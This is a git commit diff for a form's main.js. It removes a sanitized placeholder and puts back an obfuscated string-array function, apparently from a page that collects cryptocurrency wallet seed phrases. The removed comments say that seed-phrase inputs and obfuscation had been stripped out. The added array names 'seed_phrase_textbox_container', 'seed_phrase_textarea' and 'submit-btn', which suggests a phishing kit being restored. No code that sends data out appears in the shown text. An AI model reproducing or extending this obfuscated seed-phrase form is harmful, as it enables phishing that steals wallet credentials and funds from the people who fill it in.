a7a066fbec7ef8a171322bf2ea6ffedd9e6df92c
union6373638 <unionfija@gmail.com>
2026-09-11 08:35:14 -0500

    Update main.js

--- form/js/main.js
+++ form/js/main.js
@@ -1,14 +1,43 @@
-/**
- * All obfuscation arrays, index shifters, and string retrieval methods have been deleted.
- * References to 'seed_phrase_textbox', 'seed_phrase_textarea', and 'submit-btn' are removed.
- */
-(function () {
-    // Purely optional layout definitions if standard UI state tracking is necessary
-    function placeholderUIAction() {
-        // Form inputs and data sync variables completely removed
-    }
-})();
 
-// REMOVED: Interactive click binds on checkbox selectors
-// REMOVED: Synchronization between textarea mirrors and hidden container text inputs
-// REMOVED: Event overrides regulating button states (.disabled attributes)
+function _0x608c() {
+    const _0x35d368 = [
+        "target",
+        "submit-btn",
+        "disabled",
+        "length",
+        "<i\x20class=\x22fa\x20fa-check\x20fa-2x\x22\x20id=\x22fa-check\x22></i>",
+        "fa-check-2",
+        "5hGKEmH",
+        "126782dqiBwN",
+        "fa-check",
+        "display",
+        "3858ywfZDx",
+        "none",
+        "fa-check-box",
+        "style",
+        "block",
+        "24753lkffFy",
+        "stopPropagation",
+        "69060SDLQlh",
+        "seed_phrase_textbox_container",
+        "click",
+        "seed_phrase_textarea",
+        "3542ghhmGP",
+        "657pbpuka",
+        "11voiYNI",
+        "addEventListener",
+        "value",
+        "9cHrUtw",
+        "getElementById",
+        "1879260zkqbvJ",
+        "<i\x20class=\x22fa\x20fa-check\x20fa-2x\x22\x20id=\x22fa-check-2\x22></i>",
+        "childNodes",
+        "5957112YUlogO",
+        "2172076xIrgHD",
+        "innerHTML",
+    ];
+    _0x608c = function () {
+        return _0x35d368;
+    };
+    return _0x608c();
+}
